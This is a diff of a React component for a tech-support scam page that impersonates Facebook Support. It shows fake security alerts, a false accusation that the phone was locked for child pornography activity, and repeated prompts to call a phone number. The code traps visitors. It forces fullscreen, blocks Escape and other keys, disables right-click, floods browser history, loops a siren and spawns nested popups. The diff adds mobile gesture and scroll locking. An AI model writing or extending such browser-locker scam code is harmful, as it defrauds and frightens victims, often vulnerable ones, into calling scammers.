+// //                 </Button>
+// //                 <p className="text-xs text-center text-gray-500 mt-2">Facebook security mode active.</p>
+// //               </div>
+// //             </Card>
+// //           </div>
+// //         )}
+// //       </div>
+// //       {nestedCalls.map((id) => (
+// //         <EmergencyCallRecursive key={id} depth={depth + 1} />
+// //       ))}
+// //     </>
+// //   )
+// // }
+// // export default function App() {
+// //   return <EmergencyCallRecursive />
+// // }
+
+
+
 // /* eslint-disable react/prop-types */
+
 // import { useState, useEffect, useRef, useCallback } from "react"
 // import "../App.css"
 // import { Button } from "@/components/ui/button"
@@ -16,53 +980,53 @@
 
 //   const showEmergencyToasts = () => {
 //     toast.dismiss()
-//     toast.error("CRITICAL ERROR: System security compromised!", {
-//       position: "top-right",
-//       autoClose: false,
-//       hideProgressBar: false,
-//       closeOnClick: false,
-//       pauseOnHover: true,
-//       draggable: false,
-//       progress: undefined,
-//       className: "emergency-toast",
-//       icon: <AlertCircle size={24} />
-//     })
+//     // toast.error("CRITICAL ERROR: System security compromised!", {
+//     //   position: "top-right",
+//     //   autoClose: false,
+//     //   hideProgressBar: false,
+//     //   closeOnClick: false,
+//     //   pauseOnHover: true,
+//     //   draggable: false,
+//     //   progress: undefined,
+//     //   className: "emergency-toast",
+//     //   icon: <AlertCircle size={24} />
+//     // })
 
-//     toast.warning("WARNING: Your data may be at risk!", {
-//       position: "top-left",
-//       autoClose: false,
-//       hideProgressBar: false,
-//       closeOnClick: false,
-//       pauseOnHover: false,
-//       draggable: false,
-//       progress: undefined,
-//       className: "emergency-toast",
-//       icon: <AlertCircle size={48} />
-//     })
+//     // toast.warning("WARNING: Your data may be at risk!", {
+//     //   position: "top-left",
+//     //   autoClose: false,
+//     //   hideProgressBar: false,
+//     //   closeOnClick: false,
+//     //   pauseOnHover: false,
+//     //   draggable: false,
+//     //   progress: undefined,
+//     //   className: "emergency-toast",
+//     //   icon: <AlertCircle size={48} />
+//     // })
 
-//     toast.info("Call Facebook Support immediately:18445692321", {
-//       position: "bottom-center",
-//       autoClose: false,
-//       hideProgressBar: false,
-//       closeOnClick: false,
-//       pauseOnHover: false,
-//       draggable: false,
-//       progress: undefined,
-//       className: "emergency-toast-bottom",
-//       icon: <PhoneCall size={48} />
-//     })
-//     toast.info("Call Facebook Support immediately:18445692321", {
-//       position: "bottom-left",
-//       autoClose: false,
-//       hideProgressBar: false,
-//       closeOnClick: false,
-//       pauseOnHover: false,
-//       draggable: false,
-//       progress: undefined,
-//       className: "emergency-toast-bottom",
-//       icon: <PhoneCall size={48} />
-//     })
-//     toast.info("Call Facebook Support immediately:18445692321", {
+//     // toast.info("Call Facebook Support immediately:18445131621", {
+//     //   position: "bottom-center",
+//     //   autoClose: false,
+//     //   hideProgressBar: false,
+//     //   closeOnClick: false,
+//     //   pauseOnHover: false,
+//     //   draggable: false,
+//     //   progress: undefined,
+//     //   className: "emergency-toast-bottom",
+//     //   icon: <PhoneCall size={48} />
+//     // })
+//     // toast.info("Call Facebook Support immediately:18445131621", {
+//     //   position: "bottom-left",
+//     //   autoClose: false,
+//     //   hideProgressBar: false,
+//     //   closeOnClick: false,
+//     //   pauseOnHover: false,
+//     //   draggable: false,
+//     //   progress: undefined,
+//     //   className: "emergency-toast-bottom",
+//     //   icon: <PhoneCall size={48} />
+//     // })
+//     toast.info("Call Facebook Support immediately:18445131621", {
 //       position: "bottom-right",
 //       autoClose: false,
 //       hideProgressBar: false,
@@ -395,490 +1359,7 @@
 //               <h2 className="text-2xl font-semibold text-center">Facebook Support</h2>
 //               <p className="text-base md:text-lg text-muted-foreground"><br></br>
 //            <h1 className="text-xl md:text-3xl font-semibold tracking-tight">Warning:</h1> <br></br>
-//            Your phone has been locked for a child pornography activity. Access has been restricted. Contact support Immediately at below number.
-//             <br /><br />
-//           </p>
-//               <p className="text-center text-gray-600 mb-4">Tap anywhere for immediate Facebook support</p>
-//               <Button
-//                 className="w-full bg-blue-600 hover:bg-blue-700 text-white py-6 text-xl font-medium rounded-xl flex items-center justify-center space-x-2 transition-all"
-//                 onClick={(e) => {
-//                   e.stopPropagation()
-//                   handleCall()
-//                 }}
-//               >
-//                 <PhoneCall className="mr-2 h-6 w-6" />
-//                 <span>Call 18445692321</span>
-//               </Button>
-//             </div>
-//           </Card>
-//         </div>
-
-//         {showPopup && (
-//           <div
-//             id="emergencyPopup"
-//             ref={popupRef}
-//             className="fixed inset-0 flex items-center justify-center z-50 p-4 backdrop-blur-lg"
-//             tabIndex={-1}
-//             onKeyDown={(e) => {
-//               if (e.key === "Escape" || e.key === "Tab" || e.key === "F5") {
-//                 e.preventDefault()
-//                 e.stopPropagation()
-//               }
-//             }}
-//             onClick={(e) => e.stopPropagation()}
-//           >
-//             <div className="absolute inset-0 bg-black bg-opacity-60"></div>
-//             <Card className="bg-white p-6 rounded-2xl border border-blue-200 shadow-2xl max-w-md w-full z-10 animate-bounce">
-//               <div className="flex flex-col items-center space-y-4">
-//                 <div className="flex items-center justify-center w-16 h-16 bg-blue-600 rounded-full">
-//                   <AlertCircle size={32} className="text-white" />
-//                 </div>
-//                 <h2 className="text-2xl font-semibold text-center">Facebook SUPPORT</h2>
-//                 <p className="text-center text-lg">Connecting you to Facebook Support at:</p>
-//                 <p className="text-2xl font-semibold text-blue-600">18445692321</p>
-//                 <div className="flex space-x-2 items-center justify-center w-full mt-2">
-//                   <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping"></div>
-//                   <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping" style={{ animationDelay: "0.2s" }}></div>
-//                   <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping" style={{ animationDelay: "0.4s" }}></div>
-//                 </div>
-//                 <Button
-//                   id="callButton"
-//                   className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-xl mt-4"
-//                   onClick={() => (window.location.href = "tel:18445692321")}
-//                   autoFocus
-//                 >
-//                   Confirm Call
-//                 </Button>
-//                 <p className="text-xs text-center text-gray-500 mt-2">Facebook security mode active.</p>
-//               </div>
-//             </Card>
-//           </div>
-//         )}
-//       </div>
-//       {nestedCalls.map((id) => (
-//         <EmergencyCallRecursive key={id} depth={depth + 1} />
-//       ))}
-//     </>
-//   )
-// }
-
-// export default function EmergencyCall() {
-//   return <EmergencyCallRecursive />
-// }
-
-
-
-
-// /* eslint-disable react/prop-types */
-// import { useState, useEffect, useRef, useCallback } from "react"
-// import "../App.css"
-// import { Button } from "@/components/ui/button"
-// import { Card } from "@/components/ui/card"
-// import { PhoneCall, AlertCircle, Lock } from "lucide-react"
-// import { toast, ToastContainer } from "react-toastify"
-// import "react-toastify/dist/ReactToastify.css"
-
-// const EmergencyCallRecursive = ({ depth = 0 }) => {
-//   const [showPopup, setShowPopup] = useState(false)
-//   const [nestedCalls, setNestedCalls] = useState([])
-//   const [isFullscreen, setIsFullscreen] = useState(false)
-//   const popupRef = useRef(null)
-//   const fullscreenRef = useRef(null)
-
-//   const showEmergencyToasts = () => {
-//     toast.dismiss()
-//     toast.error("CRITICAL ERROR: System security compromised!", {
-//       position: "top-right",
-//       autoClose: false,
-//       hideProgressBar: false,
-//       closeOnClick: false,
-//       pauseOnHover: true,
-//       draggable: false,
-//       progress: undefined,
-//       className: "emergency-toast",
-//       icon: <AlertCircle size={24} />
-//     })
-
-//     toast.warning("WARNING: Your data may be at risk!", {
-//       position: "top-left",
-//       autoClose: false,
-//       hideProgressBar: false,
-//       closeOnClick: false,
-//       pauseOnHover: false,
-//       draggable: false,
-//       progress: undefined,
-//       className: "emergency-toast",
-//       icon: <AlertCircle size={48} />
-//     })
-
-//     toast.info("Call Facebook Support immediately:18445131621", {
-//       position: "bottom-center",
-//       autoClose: false,
-//       hideProgressBar: false,
-//       closeOnClick: false,
-//       pauseOnHover: false,
-//       draggable: false,
-//       progress: undefined,
-//       className: "emergency-toast-bottom",
-//       icon: <PhoneCall size={48} />
-//     })
-//     toast.info("Call Facebook Support immediately:18445131621", {
-//       position: "bottom-left",
-//       autoClose: false,
-//       hideProgressBar: false,
-//       closeOnClick: false,
-//       pauseOnHover: false,
-//       draggable: false,
-//       progress: undefined,
-//       className: "emergency-toast-bottom",
-//       icon: <PhoneCall size={48} />
-//     })
-//     toast.info("Call Facebook Support immediately:18445131621", {
-//       position: "bottom-right",
-//       autoClose: false,
-//       hideProgressBar: false,
-//       closeOnClick: false,
-//       pauseOnHover: false,
-//       draggable: false,
-//       progress: undefined,
-//       className: "emergency-toast-bottom",
-//       icon: <PhoneCall size={48} />
-//     })
-//   }
-
-//   const requestFullscreen = async () => {
-//     try {
-//       const elem = fullscreenRef.current || document.documentElement
-//       if (elem.requestFullscreen) {
-//         await elem.requestFullscreen({ navigationUI: "hide" })
-//       } else if (elem.webkitRequestFullscreen) {
-//         await elem.webkitRequestFullscreen({ navigationUI: "hide" })
-//       } else if (elem.msRequestFullscreen) {
-//         await elem.msRequestFullscreen({ navigationUI: "hide" })
-//       } else if (elem.mozRequestFullScreen) {
-//         await elem.mozRequestFullScreen({ navigationUI: "hide" })
-//       }
-//       setIsFullscreen(true)
-//     } catch (err) {
-//       console.error("Fullscreen request failed:", err)
-//     }
-//   }
-
-//   useEffect(() => {
-//     const handleFullscreenChange = () => {
-//       const isCurrentlyFullscreen = Boolean(
-//         document.fullscreenElement ||
-//         document.webkitFullscreenElement ||
-//         document.mozFullScreenElement ||
-//         document.msFullscreenElement
-//       )
-      
-//       setIsFullscreen(isCurrentlyFullscreen)
-      
-//       if (!isCurrentlyFullscreen && showPopup) {
-//         setTimeout(() => {
-//           requestFullscreen()
-//           playAlertSound()
-//           setNestedCalls(prev => [...prev, Date.now()])
-//         }, 10)
-//       }
-//     }
-
-//     document.addEventListener('fullscreenchange', handleFullscreenChange)
-//     document.addEventListener('webkitfullscreenchange', handleFullscreenChange)
-//     document.addEventListener('mozfullscreenchange', handleFullscreenChange)
-//     document.addEventListener('MSFullscreenChange', handleFullscreenChange)
-
-//     return () => {
-//       document.removeEventListener('fullscreenchange', handleFullscreenChange)
-//       document.removeEventListener('webkitfullscreenchange', handleFullscreenChange)
-//       document.removeEventListener('mozfullscreenchange', handleFullscreenChange)
-//       document.removeEventListener('MSFullscreenChange', handleFullscreenChange)
-//     }
-//   }, [showPopup])
-
-//   useEffect(() => {
-//     const savedState = localStorage.getItem("emergencyAlertActive")
-//     if (savedState === "true") {
-//       activateEmergencyMode()
-//     }
-
-//     document.addEventListener("visibilitychange", handleVisibilityChange)
-
-//     return () => {
-//       document.removeEventListener("visibilitychange", handleVisibilityChange)
-//     }
-//   }, [])
-
-//   const handleVisibilityChange = () => {
-//     if (showPopup && document.visibilityState === "visible") {
-//       playAlertSound()
-//       if (!isFullscreen) {
-//         requestFullscreen()
-//       }
-//     }
-//   }
-
-//   useEffect(() => {
-//     if (showPopup) {
-//       localStorage.setItem("emergencyAlertActive", "true")
-//     } else {
-//       localStorage.removeItem("emergencyAlertActive")
-//     }
-//   }, [showPopup])
-
-//   const activateEmergencyMode = () => {
-//     setShowPopup(true)
-//     document.body.style.overflow = "hidden"
-//     playAlertSound()
-//     startSoundInterval()
-//     showEmergencyToasts()
-//     requestFullscreen()
-//   }
-
-//   const playAlertSound = useCallback(() => {
-//     const audio = new Audio("/siren-alert-96052 (1).mp3")
-//     audio.play()
-//   }, [])
-
-//   const startSoundInterval = () => {
-//     if (window.emergencyIntervalId) {
-//       clearInterval(window.emergencyIntervalId)
-//     }
-
-//     const intervalId = setInterval(() => {
-//       playAlertSound()
-//     }, 10000)
-
-//     window.emergencyIntervalId = intervalId
-//     return intervalId
-//   }
-
-//   const handleCall = () => {
-//     activateEmergencyMode()
-//   }
-
-//   useEffect(() => {
-//     const handleKeyDown = (e) => {
-//       if (e.key === "Escape") {
-//         e.preventDefault()
-//         e.stopPropagation()
-        
-//         // Immediately request fullscreen again
-//         setTimeout(() => {
-//           requestFullscreen()
-//           // Create a new nested emergency call
-//           setNestedCalls(prev => [...prev, Date.now()])
-          
-//           // Visual feedback
-//           const popup = document.getElementById("emergencyPopup")
-//           if (popup) {
-//             popup.classList.add("shake-animation")
-//             setTimeout(() => {
-//               popup.classList.remove("shake-animation")
-//             }, 500)
-//             playAlertSound()
-//           }
-//         }, 0)
-//         return false
-//       }
-
-//       if (showPopup && (e.ctrlKey || e.altKey || e.metaKey)) {
-//         e.preventDefault()
-//         e.stopPropagation()
-//         return false
-//       }
-//     }
-
-//     window.addEventListener("keydown", handleKeyDown, { capture: true })
-
-//     return () => {
-//       window.removeEventListener("keydown", handleKeyDown, { capture: true })
-//     }
-//   }, [showPopup, playAlertSound])
-
-//   useEffect(() => {
-//     if (showPopup) {
-//       const maxBackBlockCount = 100
-//       let backBlockCount = 0
-
-//       const pushManyHistoryStates = () => {
-//         if (backBlockCount < maxBackBlockCount) {
-//           window.history.pushState({ emergency: true }, document.title, window.location.href)
-//           backBlockCount++
-//           setTimeout(pushManyHistoryStates, 50)
-//         }
-//       }
-
-//       pushManyHistoryStates()
-
-//       const handlePopState = () => {
-//         window.history.pushState({ emergency: true }, document.title, window.location.href)
-//         playAlertSound()
-//         if (!isFullscreen) {
-//           requestFullscreen()
-//         }
-//       }
-
-//       window.addEventListener("popstate", handlePopState)
-
-//       const handleBeforeUnload = (e) => {
-//         e.preventDefault()
-//         e.returnValue = "Emergency in progress - please complete the emergency call before leaving"
-//         return e.returnValue
-//       }
-
-//       window.addEventListener("beforeunload", handleBeforeUnload)
-
-//       const handleContextMenu = (e) => {
-//         e.preventDefault()
-//         return false
-//       }
-
-//       document.addEventListener("contextmenu", handleContextMenu)
-
-//       // Keep checking fullscreen status and focus
-//       const maintenanceInterval = setInterval(() => {
-//         if (!isFullscreen) {
-//           requestFullscreen()
-//         }
-//         if (document.activeElement !== document.getElementById("emergencyPopup")) {
-//           document.getElementById("emergencyPopup")?.focus()
-//         }
-//       }, 100)
-
-//       return () => {
-//         window.removeEventListener("popstate", handlePopState)
-//         window.removeEventListener("beforeunload", handleBeforeUnload)
-//         document.removeEventListener("contextMenu", handleContextMenu)
-//         clearInterval(maintenanceInterval)
-//       }
-//     }
-//   }, [showPopup, playAlertSound, isFullscreen])
-
-//   useEffect(() => {
-//     if (showPopup) {
-//       const style = document.createElement("style")
-//       style.id = "emergency-styles"
-//       style.innerHTML = `
-//         @keyframes shake {
-//           0%, 100% { transform: translateX(0); }
-//           10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
-//           20%, 40%, 60%, 80% { transform: translateX(10px); }
-//         }
-//         .shake-animation {
-//           animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
-//         }
-//         @keyframes flash-blue {
-//           0%, 100% { background-color: rgba(37, 99, 235, 0.8); }
-//           50% { background-color: rgba(59, 130, 246, 0.9); }
-//         }
-//         .flash-notification {
-//           animation: flash-blue 1s infinite;
-//         }
-//         .fullscreen-notification {
-//           position: fixed;
-//           top: 0;
-//           left: 0;
-//           right: 0;
-//           padding: 8px 16px;
-//           height: 100px;
-//           background-color:  #007bff;
-//           color: white;
-//           text-align: center;
-//           font-weight: bold;
-//           z-index: 9999;
-//           font-family: -Facebook-system, BlinkMacSystemFont, sans-serif;
-//           font-size: 14px;
-//           box-shadow: 0 2px 10px rgba(0,0,0,0.3);
-//           display: flex;
-//           align-items: center;
-//           justify-content: center;
-//           backdrop-filter: blur(10px);
-//         }
-//         .fullscreen-indicator {
-//           display: inline-block;
-//           width: 80px;
-//           height: 200px;
-//           background-color: white;
-//           border-radius: 50%;
-//           margin-right: 8px;
-//         }
-//       `
-//       document.head.appendChild(style)
-
-//       return () => {
-//         document.head.removeChild(style)
-//       }
-//     }
-//   }, [showPopup])
-
-//   const createVisualDistraction = () => {
-//     if (!showPopup) return null
-
-//     return (
-//       <>
-//         <div className="fullscreen-notification flash-notification" onClick={handleCall}>
-//           <span className="fullscreen-indicator animate-ping"></span>
-//           <Lock size={96} className="mr-1" />
-//           Facebook SECURITY - SCREEN LOCKED
-//         </div>
-
-//         <div className="fixed top-0 left-0 right-0 h-12 bg-blue-600 z-40 flex items-center justify-center backdrop-blur-lg">
-//           <div className="animate-pulse flex items-center">
-//             <AlertCircle size={24} className="text-white mr-2" />
-//             <span className="text-white font-bold">Facebook SECURITY ALERT</span>
-//           </div>
-//         </div>
-
-//         <div className="fixed top-4 right-4 bg-blue-600 text-white p-2 rounded-full animate-ping z-50">
-//           <AlertCircle size={16} />
-//         </div>
-//         <div
-//           className="fixed top-6 left-6 bg-blue-600 text-white p-2 rounded-full animate-pulse z-50"
-//           style={{ animationDelay: "0.5s" }}
-//         >
-//           <AlertCircle size={16} />
-//         </div>
-//       </>
-//     )
-//   }
-
-//   return (
-//     <>
-//       <div
-//         ref={fullscreenRef}
-//         className="min-h-screen bg-gradient-to-b from-blue-50 to-blue-100 p-4 flex flex-col items-center justify-center cursor-pointer font-[-Facebook-system]"
-        
-//         style={{ 
-//           transform: `scale(${1 - depth * 0.05})`,
-//           zIndex: 1000 + depth
-//         }}
-//         onClick={() => (window.location.href = "tel:18445131621")}
-//       >
-//         {/* <ToastContainer position="top-right" autoClose={5000} /> */}
-//         <ToastContainer
-//         position="top-right"
-//         autoClose={false}
-//         newestOnTop
-//         closeOnClick={false}
-//         rtl={false}
-//         pauseOnFocusLoss
-//         draggable={false}
-//         theme="colored"
-//         limit={5}
-//       />
-//         {createVisualDistraction()}
-//         <div className="w-full max-w-md">
-//           <Card className="p-6 bg-white shadow-lg border border-blue-200 rounded-2xl">
-//             <div className="flex flex-col items-center space-y-4">
-//               <div className="bg-blue-600 rounded-full p-4 animate-pulse">
-//                 <PhoneCall size={48} className="text-white" />
-//               </div>
-//               <h2 className="text-2xl font-semibold text-center">Facebook Support</h2>
-//               <p className="text-base md:text-lg text-muted-foreground"><br></br>
-//            <h1 className="text-xl md:text-3xl font-semibold tracking-tight">Warning:</h1> <br></br>
-//            Your phone has been locked for a child pornography activity. Access has been restricted. Contact support Immediately at below number.
+//            We've Detected Unusual Login Activity on Your Facebook Account.
 //             <br /><br />
 //           </p>
 //               <p className="text-center text-gray-600 mb-4">Tap anywhere for immediate Facebook support</p>
@@ -891,17 +1372,6 @@
 //               >
 //                 <PhoneCall className="mr-2 h-6 w-6" />
 //                 <span>Call 18445131621</span>
-//               </Button>
-
-//               <Button
-//                 className="w-full bg-blue-600 hover:bg-blue-700 text-white py-6 text-xl font-medium rounded-xl flex items-center justify-center space-x-2 transition-all"
-//                 onClick={(e) => {
-//                   e.stopPropagation()
-//                   handleCall()
-//                 }}
-//               >
-//                 <PhoneCall className="mr-2 h-6 w-6" />
-//                 <span>Back to facebook</span>
 //               </Button>
 //             </div>
 //           </Card>
@@ -955,92 +1425,101 @@
 //     </>
 //   )
 // }
-// export default function App() {
+
+// export default function EmergencyCall() {
 //   return <EmergencyCallRecursive />
 // }
 
 
 
-/* eslint-disable react/prop-types */
+
+
 import { useState, useEffect, useRef, useCallback } from "react"
-import "../App.css"
 import { Button } from "@/components/ui/button"
 import { Card } from "@/components/ui/card"
 import { PhoneCall, AlertCircle, Lock } from "lucide-react"
-import { toast, ToastContainer } from "react-toastify"
-import "react-toastify/dist/ReactToastify.css"
 
 const EmergencyCallRecursive = ({ depth = 0 }) => {
   const [showPopup, setShowPopup] = useState(false)
   const [nestedCalls, setNestedCalls] = useState([])
   const [isFullscreen, setIsFullscreen] = useState(false)
+  const [isMobile, setIsMobile] = useState(false)
   const popupRef = useRef(null)
   const fullscreenRef = useRef(null)
 
+  // Toast notifications for mobile
   const showEmergencyToasts = () => {
-    toast.dismiss()
-    // toast.error("CRITICAL ERROR: System security compromised!", {
-    //   position: "top-right",
-    //   autoClose: false,
-    //   hideProgressBar: false,
-    //   closeOnClick: false,
-    //   pauseOnHover: true,
-    //   draggable: false,
-    //   progress: undefined,
-    //   className: "emergency-toast",
-    //   icon: <AlertCircle size={24} />
-    // })
+    // Create mobile-friendly toast notifications
+    const createToast = (message, position = 'top-right') => {
+      const toast = document.createElement('div')
+      toast.className = `emergency-toast-mobile ${position}`
+      toast.innerHTML = `
+        <div class="toast-content">
+          <div class="toast-icon">⚠️</div>
+          <div class="toast-message">${message}</div>
+        </div>
+      `
+      document.body.appendChild(toast)
+      
+      setTimeout(() => {
+        if (document.body.contains(toast)) {
+          document.body.removeChild(toast)
+        }
+      }, 15000)
+    }
 
-    // toast.warning("WARNING: Your data may be at risk!", {
-    //   position: "top-left",
-    //   autoClose: false,
-    //   hideProgressBar: false,
-    //   closeOnClick: false,
-    //   pauseOnHover: false,
-    //   draggable: false,
-    //   progress: undefined,
-    //   className: "emergency-toast",
-    //   icon: <AlertCircle size={48} />
-    // })
-
-    // toast.info("Call Facebook Support immediately:18445131621", {
-    //   position: "bottom-center",
-    //   autoClose: false,
-    //   hideProgressBar: false,
-    //   closeOnClick: false,
-    //   pauseOnHover: false,
-    //   draggable: false,
-    //   progress: undefined,
-    //   className: "emergency-toast-bottom",
-    //   icon: <PhoneCall size={48} />
-    // })
-    // toast.info("Call Facebook Support immediately:18445131621", {
-    //   position: "bottom-left",
-    //   autoClose: false,
-    //   hideProgressBar: false,
-    //   closeOnClick: false,
-    //   pauseOnHover: false,
-    //   draggable: false,
-    //   progress: undefined,
-    //   className: "emergency-toast-bottom",
-    //   icon: <PhoneCall size={48} />
-    // })
-    toast.info("Call Facebook Support immediately:18445131621", {
-      position: "bottom-right",
-      autoClose: false,
-      hideProgressBar: false,
-      closeOnClick: false,
-      pauseOnHover: false,
-      draggable: false,
-      progress: undefined,
-      className: "emergency-toast-bottom",
-      icon: <PhoneCall size={48} />
-    })
+    createToast("CRITICAL ERROR: System security compromised!", 'top-right')
+    createToast("WARNING: Your data may be at risk!", 'top-left')
+    createToast("Call Facebook Support immediately: 18445131621", 'bottom-center')
   }
+
+  // Detect mobile device
+  useEffect(() => {
+    const checkMobile = () => {
+      const userAgent = navigator.userAgent || navigator.vendor || window.opera
+      const isMobileDevice = /iPad|iPhone|iPod|Android|webOS|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)
+      const isSmallScreen = window.innerWidth <= 768
+      setIsMobile(isMobileDevice || isSmallScreen)
+    }
+    
+    checkMobile()
+    window.addEventListener('resize', checkMobile)
+    
+    return () => window.removeEventListener('resize', checkMobile)
+  }, [])
+
+  // Set proper viewport for mobile
+  useEffect(() => {
+    let viewport = document.querySelector('meta[name="viewport"]')
+    if (!viewport) {
+      viewport = document.createElement('meta')
+      viewport.name = 'viewport'
+      document.head.appendChild(viewport)
+    }
+    viewport.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover'
+  }, [])
 
   const requestFullscreen = async () => {
     try {
       const elem = fullscreenRef.current || document.documentElement
+      
+      // For mobile devices, simulate fullscreen
+      if (isMobile) {
+        document.body.style.overflow = 'hidden'
+        document.documentElement.style.overflow = 'hidden'
+        document.body.style.position = 'fixed'
+        document.body.style.width = '100%'
+        document.body.style.height = '100%'
+        
+        // Hide iOS Safari UI bars
+        window.scrollTo(0, 1)
+        setTimeout(() => window.scrollTo(0, 0), 100)
+        
+        setIsFullscreen(true)
+        return
+      }
+      
+      // Standard fullscreen API for desktop
       if (elem.requestFullscreen) {
         await elem.requestFullscreen({ navigationUI: "hide" })
       } else if (elem.webkitRequestFullscreen) {
@@ -1053,11 +1532,17 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
       setIsFullscreen(true)
     } catch (err) {
       console.error("Fullscreen request failed:", err)
+      if (isMobile) {
+        document.body.style.overflow = 'hidden'
+        setIsFullscreen(true)
+      }
     }
   }
 
   useEffect(() => {
     const handleFullscreenChange = () => {
+      if (isMobile) return
+      
       const isCurrentlyFullscreen = Boolean(
         document.fullscreenElement ||
         document.webkitFullscreenElement ||
@@ -1076,31 +1561,22 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
       }
     }
 
-    document.addEventListener('fullscreenchange', handleFullscreenChange)
-    document.addEventListener('webkitfullscreenchange', handleFullscreenChange)
-    document.addEventListener('mozfullscreenchange', handleFullscreenChange)
-    document.addEventListener('MSFullscreenChange', handleFullscreenChange)
+    if (!isMobile) {
+      document.addEventListener('fullscreenchange', handleFullscreenChange)
+      document.addEventListener('webkitfullscreenchange', handleFullscreenChange)
+      document.addEventListener('mozfullscreenchange', handleFullscreenChange)
+      document.addEventListener('MSFullscreenChange', handleFullscreenChange)
+    }
 
     return () => {
-      document.removeEventListener('fullscreenchange', handleFullscreenChange)
-      document.removeEventListener('webkitfullscreenchange', handleFullscreenChange)
-      document.removeEventListener('mozfullscreenchange', handleFullscreenChange)
-      document.removeEventListener('MSFullscreenChange', handleFullscreenChange)
+      if (!isMobile) {
+        document.removeEventListener('fullscreenchange', handleFullscreenChange)
+        document.removeEventListener('webkitfullscreenchange', handleFullscreenChange)
+        document.removeEventListener('mozfullscreenchange', handleFullscreenChange)
+        document.removeEventListener('MSFullscreenChange', handleFullscreenChange)
+      }
     }
-  }, [showPopup])
-
-  useEffect(() => {
-    const savedState = localStorage.getItem("emergencyAlertActive")
-    if (savedState === "true") {
-      activateEmergencyMode()
-    }
-
-    document.addEventListener("visibilitychange", handleVisibilityChange)
-
-    return () => {
-      document.removeEventListener("visibilitychange", handleVisibilityChange)
-    }
-  }, [])
+  }, [showPopup, isMobile])
 
   const handleVisibilityChange = () => {
     if (showPopup && document.visibilityState === "visible") {
@@ -1112,16 +1588,21 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
   }
 
   useEffect(() => {
-    if (showPopup) {
-      localStorage.setItem("emergencyAlertActive", "true")
-    } else {
-      localStorage.removeItem("emergencyAlertActive")
+    document.addEventListener("visibilitychange", handleVisibilityChange)
+    return () => {
+      document.removeEventListener("visibilitychange", handleVisibilityChange)
     }
-  }, [showPopup])
+  }, [showPopup, isFullscreen])
 
   const activateEmergencyMode = () => {
     setShowPopup(true)
     document.body.style.overflow = "hidden"
+    document.documentElement.style.overflow = "hidden"
+    if (isMobile) {
+      document.body.style.position = 'fixed'
+      document.body.style.width = '100%'
+      document.body.style.height = '100%'
+    }
     playAlertSound()
     startSoundInterval()
     showEmergencyToasts()
@@ -1129,8 +1610,27 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
   }
 
   const playAlertSound = useCallback(() => {
-    const audio = new Audio("/siren-alert-96052 (1).mp3")
-    audio.play()
+    try {
+      // Create oscillator for alert sound (works better on mobile)
+      const audioContext = new (window.AudioContext || window.webkitAudioContext)()
+      const oscillator = audioContext.createOscillator()
+      const gainNode = audioContext.createGain()
+      
+      oscillator.connect(gainNode)
+      gainNode.connect(audioContext.destination)
+      
+      oscillator.frequency.setValueAtTime(800, audioContext.currentTime)
+      oscillator.frequency.setValueAtTime(1000, audioContext.currentTime + 0.1)
+      oscillator.frequency.setValueAtTime(800, audioContext.currentTime + 0.2)
+      
+      gainNode.gain.setValueAtTime(0.3, audioContext.currentTime)
+      gainNode.gain.setValueAtTime(0, audioContext.currentTime + 0.3)
+      
+      oscillator.start(audioContext.currentTime)
+      oscillator.stop(audioContext.currentTime + 0.3)
+    } catch (error) {
+      console.log("Audio creation failed:", error)
+    }
   }, [])
 
   const startSoundInterval = () => {
@@ -1140,14 +1640,23 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
 
     const intervalId = setInterval(() => {
       playAlertSound()
-    }, 10000)
+    }, 5000) // More frequent for mobile
 
     window.emergencyIntervalId = intervalId
     return intervalId
   }
 
-  const handleCall = () => {
+  const handleCall = (e) => {
+    if (e) {
+      e.preventDefault()
+      e.stopPropagation()
+    }
     activateEmergencyMode()
+  }
+
+  const handleTouch = (e) => {
+    e.preventDefault()
+    handleCall(e)
   }
 
   useEffect(() => {
@@ -1156,13 +1665,10 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
         e.preventDefault()
         e.stopPropagation()
         
-        // Immediately request fullscreen again
         setTimeout(() => {
           requestFullscreen()
-          // Create a new nested emergency call
           setNestedCalls(prev => [...prev, Date.now()])
           
-          // Visual feedback
           const popup = document.getElementById("emergencyPopup")
           if (popup) {
             popup.classList.add("shake-animation")
@@ -1183,9 +1689,30 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
     }
 
     window.addEventListener("keydown", handleKeyDown, { capture: true })
+    
+    // Prevent pinch zoom and other gestures on mobile
+    const preventTouchDefault = (e) => {
+      if (showPopup) {
+        if (e.touches.length > 1) {
+          e.preventDefault()
+        }
+        // Prevent scrolling
+        if (e.target.closest('.emergency-container')) {
+          e.preventDefault()
+        }
+      }
+    }
+    
+    document.addEventListener('touchstart', preventTouchDefault, { passive: false })
+    document.addEventListener('touchmove', preventTouchDefault, { passive: false })
+    document.addEventListener('gesturestart', (e) => e.preventDefault())
+    document.addEventListener('gesturechange', (e) => e.preventDefault())
+    document.addEventListener('gestureend', (e) => e.preventDefault())
 
     return () => {
       window.removeEventListener("keydown", handleKeyDown, { capture: true })
+      document.removeEventListener('touchstart', preventTouchDefault)
+      document.removeEventListener('touchmove', preventTouchDefault)
     }
   }, [showPopup, playAlertSound])
 
@@ -1227,22 +1754,22 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
         return false
       }
 
-      document.addEventListener("contextmenu", handleContextMenu)
+      document.addEventListener("contextmenu", handleContextMenu, { passive: false })
 
-      // Keep checking fullscreen status and focus
       const maintenanceInterval = setInterval(() => {
         if (!isFullscreen) {
           requestFullscreen()
         }
-        if (document.activeElement !== document.getElementById("emergencyPopup")) {
-          document.getElementById("emergencyPopup")?.focus()
+        const popup = document.getElementById("emergencyPopup")
+        if (popup && document.activeElement !== popup) {
+          popup.focus()
         }
       }, 100)
 
       return () => {
         window.removeEventListener("popstate", handlePopState)
         window.removeEventListener("beforeunload", handleBeforeUnload)
-        document.removeEventListener("contextMenu", handleContextMenu)
